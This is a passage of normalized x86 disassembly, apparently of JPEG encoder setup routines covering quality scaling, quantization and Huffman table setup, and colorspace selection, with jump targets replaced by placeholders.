call [ edx + 0xc ]
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
call [ edx + 0x10 ]
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_420b30
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x13c ]
call [ ecx ]
add esp 0x4
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0xe0 ]
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x13c ]
call [ edx + 0x8 ]
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x148 ]
call [ eax + 0x4 ]
add esp 0x8
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xe0 ]
mov [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
call [ eax ]
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x18
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
sub_41df80
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x64
je r-xdata
mov ecx [ ebp + 0xc ]
and ecx 0xff
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x14
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x10 ]
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
call [ edx + 0x8 ]
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_42b180
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x13c ]
call [ eax ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xd0 ] 0x0
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xb0 ]
neg eax
sbb eax eax
neg eax
add eax 0x65
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_41dd30
add esp 0x8
sub_41e040
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x65
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0xd0 ]
cmp eax [ edx + 0x20 ]
jb r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x14
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x7b
push 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x13c ]
xor edx edx
mov dl [ ecx + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xd0 ]
mov [ edx + 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
call [ edx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x20 ]
sub edx [ ecx + 0xd0 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0x8 ]
jbe r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x13c ]
call [ edx + 0x4 ]
add esp 0x4
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x10 ]
push edx
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x140 ]
call [ ecx + 0x4 ]
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xd0 ]
add eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xd0 ] eax
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] ecx
sub_41e170
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x64
je r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x14
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x1f
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp + 0xc ] 0x4
jl r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_420bf0
add esp 0x4
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax * 4 + 0x48 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x40
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov [ edx + 0x80 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 ]
imul eax [ ebp + 0x14 ]
add eax 0x32
cdq
mov ecx 0x64
idiv ecx
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jg r-xdata
cmp [ ebp - 0xc ] 0x7fff
jle r-xdata
mov [ ebp - 0xc ] 0x1
mov edx [ ebp + 0x18 ]
and edx 0xff
test edx edx
je r-xdata
mov [ ebp - 0xc ] 0x7fff
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov ax [ ebp - 0xc ]
mov [ ecx + edx * 2 ] ax
jmp r-xdata
cmp [ ebp - 0xc ] 0xff
jle r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0xff
sub_41e2a0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov al [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
push r--data
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_41e170
add esp 0x14
mov al [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
push r--data
push 0x1
mov edx [ ebp + 0x8 ]
push edx
call sub_41e170
add esp 0x14
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e2f0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ ebp + 0x8 ] 0x64
jle r-xdata
mov [ ebp + 0x8 ] 0x1
cmp [ ebp + 0x8 ] 0x32
jge r-xdata
mov [ ebp + 0x8 ] 0x64
mov eax [ ebp + 0x8 ]
shl eax 0x1
mov ecx 0xc8
sub ecx eax
mov [ ebp + 0x8 ] ecx
mov eax 0x1388
cdq
idiv [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e340
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
push eax
call sub_41e2f0
add esp 0x4
mov [ ebp + 0xc ] eax
mov cl [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41e2a0
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e380
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x64
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x44 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x14
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] 0x8
push 0x1
push 0x4b
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41e340
add esp 0xc
mov edx [ ebp + 0x8 ]
push edx
call sub_41e520
add esp 0x4
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
push 0x348
push 0x0
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx ]
add esp 0xc
mov edx [ ebp + 0x8 ]
mov [ edx + 0x44 ] eax
cmp [ ebp - 0x4 ] 0x10
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xac ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xa8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xb0 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb1 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb2 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x38 ] 0x8
jle r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ecx + 0x78 ] 0x0
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x88 ] 0x1
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax + 0x98 ] 0x5
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb3 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xb4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb8 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xbc ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc0 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc5 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc6 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc7 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc8 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0xca ] 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_41e670
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb2 ] 0x1
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_41e520
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
push r--data
push r--data
mov eax [ ebp + 0x8 ]
add eax 0x58
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41e5b0
add esp 0x10
push r--data
push r--data
mov edx [ ebp + 0x8 ]
add edx 0x68
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41e5b0
add esp 0x10
push r--data
push r--data
mov ecx [ ebp + 0x8 ]
add ecx 0x5c
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_41e5b0
add esp 0x10
push r--data
push r--data
mov eax [ ebp + 0x8 ]
add eax 0x6c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41e5b0
add esp 0x10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e5b0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push 0x11
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push edx
call memcpy
add esp 0xc
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_420c30
add esp 0x4
mov edx [ ebp + 0xc ]
mov [ edx ] eax
cmp [ ebp - 0x8 ] 0x10
jg r-xdata
cmp [ ebp - 0x4 ] 0x1
jl r-xdata
mov ecx [ ebp + 0x10 ]
add ecx [ ebp - 0x8 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0x4 ] 0x100
jle r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
add eax 0x11
push eax
call memcpy
add esp 0xc
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ edx + 0x111 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e670
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x5
ja r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x9
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp - 0x4 ]
jmp [ edx * 4 + jump_table_41e713 ]
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_41e730
add esp 0x8
jmp r-xdata
push 0x3
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41e730
add esp 0x8
jmp r-xdata
push 0x3
mov edx [ ebp + 0x8 ]
push edx
call sub_41e730
add esp 0x8
jmp r-xdata
push 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_41e730
add esp 0x8
jmp r-xdata
push 0x5
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41e730
add esp 0x8
jmp r-xdata
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_41e730
add esp 0x8
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e730
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x64
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x40 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xcc ] 0x0
mov edx [ ebp + 0xc ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x5
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x14
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov eax [ ebp - 0xc ]
jmp [ eax * 4 + jump_table_41ed27 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc4 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xcc ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x3c ] 0x3
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x52
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
add ecx 0x54
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x47
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0xa8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] 0x42
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc4 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] 0x3
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x2
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x2
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x54
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] 0x2
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
add edx 0xa8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x3
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0xcc ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] 0x43
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
add edx 0x54
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x4d
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
add ecx 0xa8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x59
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0xfc
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] 0x4b
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xcc ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x2
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x2
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
add eax 0x54
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] 0x2
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
add edx 0xa8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x3
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
add ecx 0xfc
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x2
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x2
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
mov [ edx + 0x3c ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x3c ] 0x1
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x1a
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x3c ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x1c ] 0xa
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x3c ] 0xa
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x3c ]
jge r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x54
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
add edx eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
jmp r-xdata
